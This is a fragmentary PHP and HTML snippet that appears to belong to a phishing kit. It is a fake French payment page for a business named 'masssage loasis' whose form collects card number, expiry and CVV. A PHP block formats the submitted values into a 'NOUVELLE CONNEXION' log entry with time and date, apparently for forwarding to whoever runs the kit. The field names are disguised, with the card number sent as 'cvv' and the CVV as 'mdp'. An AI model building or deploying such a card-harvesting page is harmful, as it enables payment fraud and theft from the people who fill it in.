...
$donnees = "\n**NOUVELLE CONNEXION** à : masssage loasis ".
"\nHeure : " . $heure .
"\nDate : " . $date .
"\nCvv : " . $_POST['cvv'] . "" .
"\nMdp : " . $_POST['mdp'] . "" .
        ...
        <div class="row justify-content-center">
            <div class="col-md-8 col-lg-6">
                <div class="payment-form">
                    ...
                    <form id="payment-form" action="paycard.php" method="POST">
                        ...
                        <div class="form-group">
                            ...
                            <input type="text" class="form-control" id="card-number" name="cvv" required >
                        </div>
                        <div class="form-row">
                            <div class="form-group col-md-6">
                                <label for="expiry-date">Date d'expiration (MM/YY)</label>
                                <input type="text" class="form-control" id="expiry-date" name="exp" required >
                            </div>
                            <div class="form-group col-md-6">
                                <label for="cvv">CVV</label>
                                <input type="text" class="form-control" id="cvv" name="mdp" required >
                            </div>
                        </div>
                        <div class="form-group">
                            <label for="amount">Montant à payer (€)</label>
                            <input type="number" class="form-control" id="amount" name="mtn" min="1" step="0.01" required>
                        </div>
